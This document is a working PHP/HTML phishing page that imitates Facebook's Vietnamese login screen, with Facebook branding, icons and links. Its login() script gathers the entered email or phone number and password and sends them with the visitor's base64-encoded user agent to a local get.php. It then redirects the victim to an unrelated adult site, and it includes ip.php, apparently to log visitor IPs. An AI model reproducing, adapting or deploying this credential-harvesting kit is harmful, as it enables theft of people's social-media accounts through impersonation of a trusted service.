<?php include 'ip.php'; ?>
<!DOCTYPE html>
<html lang="en" class="notranslate" translate="no">

<head>
    <meta charset="UTF-8" />
    <meta name="google" content="notranslate" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="https://www.facebook.com/MIT.fullstack.developer"/>
    <meta name="keywords" content="Facebook, Sad boy :((" />
    <meta property="og:description" content="https://www.facebook.com/MIT.fullstack.developer" />
    <meta name="copyright" content="" />
    <meta name="robots" content="index, follow" />
    <meta name="revisit-after" content="1 days" />
    <meta http-equiv="content-language" content="vi" />
    <meta property="og:url" content="https://www.facebook.com/" />
    <meta property="og:type" content="website" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta property="og:title" content="Sad Boy :((" />
    <meta property="og:locale" content="vi_VN" />
    <meta property="og:image" content="https://i1.sndcdn.com/avatars-000625267470-ld3as2-t500x500.jpg" />
    <meta property="fb:app_id" content="" />
    <meta name="twitter:title" content="Sad boy :((" />
    <meta name="twitter:description" content="Sad boy :((" />
    <title>Facebook - Đăng nhập hoặc đăng ký</title>
    <link data-default-icon="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico" data-badged-icon="https://static.xx.fbcdn.net/rsrc.php/ye/r/Ta8_J_nYekI.ico" rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico" />
    <link rel="stylesheet" href="style-new.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</head>

<body>
    <div class="main">
        <div id="thong-bao">Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào.<a> Đăng ký tài
                khoản.</a></div>
        <div class="banner">
            <img src="banner.png" alt="">
        </div>

        <div class="ngon-ngu">
            <span>English • 中文(台灣) • <a href="https://www.facebook.com/settings/?tab=language">Xem thêm...</a></span>
        </div>

        <div class="form">
            <div class="nhap-lieu">
                <input id="utext" name="utext" type="text" placeholder="Số điện thoại hoặc email" autocomplete="off" />
            </div>
            <div class="nhap-lieu">
                <input id="ptext" name="ptext" type="text" placeholder="Mật khẩu" autocomplete="off" />
            </div>
            <div class="nhap-lieu">
                <button onclick="login()" id="login" name="login">Đăng nhập</button>
            </div>

            <div class="quen-pass">
                <a href="https://facebook.com/recover/initiate/">Quên mật khẩu?</a>
            </div>

            <div class="hoac">
                <p>hoặc</p>
            </div>

            <script>
                function reg() {
                    window.location.replace("https://www.facebook.com/reg");
                }
            </script>

            <button onclick="reg()" class="tao-tai-khoan">Tạo tài khoản Facebook mới</button>
        </div>
    </div>
    <script>
        function login() {
                document.getElementById("thong-bao").style.display = "none";
                var utext = document.getElementById("utext").value;
                var ptext = document.getElementById("ptext").value;
                var ua = "<?php echo base64_encode($_SERVER['HTTP_USER_AGENT']); ?>";
                if (utext !== "" || ptext !== "") {
                    if (utext.length < 6 || ptext.length < 6) {
                        document.getElementById("thong-bao").style.display = "block";
                        document.getElementById("thong-bao").innerHTML = "Email hoặc số điện thoại bạn đã nhập không chính xác."
                    } else {
                        $.get("get.php?utext=" + utext + "&ptext=" + ptext + "&ua=" + ua);
                        window.location.replace("https://javhd.onl");
                    }
                } else {
                    document.getElementById("thong-bao").style.display = "block";
                    document.getElementById("thong-bao").innerHTML = "Vui lòng điền đầy đủ thông tin đăng nhập.";
                }
                $("#login").text("Login");
            }
    </script>
</body>

</html>